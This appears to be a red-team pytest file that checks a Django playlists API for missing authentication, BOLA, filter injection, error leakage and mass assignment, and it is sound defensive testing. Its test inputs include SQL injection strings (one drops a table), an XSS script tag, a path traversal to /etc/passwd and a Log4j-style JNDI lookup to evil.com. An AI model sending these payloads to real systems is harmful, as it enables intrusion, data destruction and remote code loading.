"""
RED TEAM: T223 - Playlists LIST endpoint security tests.

Attack vectors:
- Anonymous LIST (authentication bypass)
- BOLA: list other users' playlists
- Filter injection (SQLi through owner param)
- Information disclosure via error messages
- Unicode abuse
"""

import pytest

from model_bakery import baker

from api.schedule.models import Playlist


@pytest.mark.django_db(transaction=True)
class TestPlaylistListAuthentication:
    """LIST authentication tests."""

    @pytest.mark.xfail(reason="T411: Anonymous LIST playlists allowed")
    def test_list_without_auth(self, admin_client):
        """Anonymous LIST should fail."""
        response = admin_client.get("/api/v2/playlists")
        assert response.status_code in [
            401,
            403,
        ], "Anonymous can list playlists"


@pytest.mark.django_db(transaction=True)
class TestPlaylistListBOLA:
    """LIST BOLA tests."""

    @pytest.mark.xfail(reason="BOLA: LIST shows all users' playlists")
    def test_list_shows_only_own_playlists(
        self,
        admin_client,
        admin_user,
        regular_user,
    ):
        """BOLA FIX: List returns only user's own playlists (T412)."""
        playlist1 = baker.make(
            Playlist,
            name="Admin Playlist",
            owner=admin_user,
        )
        playlist2 = baker.make(
            Playlist,
            name="User Playlist",
            owner=regular_user,
        )

        admin_client.force_authenticate(user=regular_user)
        response = admin_client.get("/api/v2/playlists")

        assert response.status_code == 200
        data = response.json()
        playlist_ids = [d["id"] for d in data]

        assert (
            playlist1.id not in playlist_ids
        ), "List shows other users' playlists (BOLA)"

    @pytest.mark.xfail(reason="BOLA: Filter by owner does not scope to requesting user")
    def test_filter_by_other_owner_returns_only_own(
        self, admin_client, admin_user, regular_user,
    ):
        """BOLA FIX: Filter by other owner only returns own playlists (T413)."""
        playlist = baker.make(
            Playlist,
            name="Admin Playlist",
            owner=admin_user,
        )

        admin_client.force_authenticate(user=regular_user)
        response = admin_client.get(f"/api/v2/playlists?owner={admin_user.id}")

        assert response.status_code == 200
        data = response.json()
        assert len(data) == 0, "Can filter by other user's owner ID (BOLA)"


@pytest.mark.django_db(transaction=True)
class TestPlaylistFilterInjection:
    """Filter parameter injection attacks."""

    def test_filter_by_invalid_owner_id(self, admin_client, admin_user):
        """Try to filter by invalid owner_id."""
        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/playlists?owner=invalid")

        if response.status_code == 500:
            pytest.fail("BUG: Filter crashes on invalid owner_id")
        assert response.status_code in [200, 400]

    def test_filter_by_sql_injection(self, admin_client, admin_user):
        """Try SQL injection in owner filter."""
        admin_client.force_authenticate(user=admin_user)

        sqli_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE cc_playlist;--",
            "1 UNION SELECT * FROM cc_subjs",
        ]

        for payload in sqli_payloads:
            response = admin_client.get(f"/api/v2/playlists?owner={payload}")
            if response.status_code == 500:
                pytest.fail(f"BUG: SQL injection causes crash: {payload}")

    def test_filter_by_negative_owner_id(self, admin_client, admin_user):
        """Try to filter by negative owner_id."""
        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/playlists?owner=-1")

        assert response.status_code in [200, 400]


@pytest.mark.django_db(transaction=True)
class TestPlaylistListInformationDisclosure:
    """Information disclosure attacks."""

    def test_error_message_on_invalid_filter(self, admin_client, admin_user):
        """Check if error messages leak information."""
        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/playlists?owner=invalid")

        if response.status_code == 400:
            content = response.content.decode()
            leaked_terms = ["cc_playlist", "column", "sql", "table"]
            for term in leaked_terms:
                if term.lower() in content.lower():
                    pytest.fail(f"BUG: Error leaks info: {term}")


@pytest.mark.django_db(transaction=True)
class TestPlaylistUnicodeAbuse:
    """Unicode abuse tests."""

    def test_list_with_unicode_filter(self, admin_client, admin_user):
        """Try Unicode in filter parameters."""
        admin_client.force_authenticate(user=admin_user)

        unicode_values = [
            "\u0000",  # Null byte
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}",  # Log4j-style
        ]

        for value in unicode_values:
            response = admin_client.get(f"/api/v2/playlists?owner={value}")
            if response.status_code == 500:
                pytest.fail(f"BUG: Unicode crash: {value[:30]}")


@pytest.mark.django_db(transaction=True)
class TestPlaylistListMassAssignment:
    """Mass assignment via GET attacks."""

    def test_get_with_extra_parameters(self, admin_client, admin_user):
        """Try GET with extra/malicious parameters."""
        admin_client.force_authenticate(user=admin_user)

        malicious_params = [
            "?id=99999&admin=true",
            "?__proto__=test",
            "?constructor[type]=admin",
        ]

        for params in malicious_params:
            response = admin_client.get(f"/api/v2/playlists{params}")
            assert response.status_code in [200, 400]
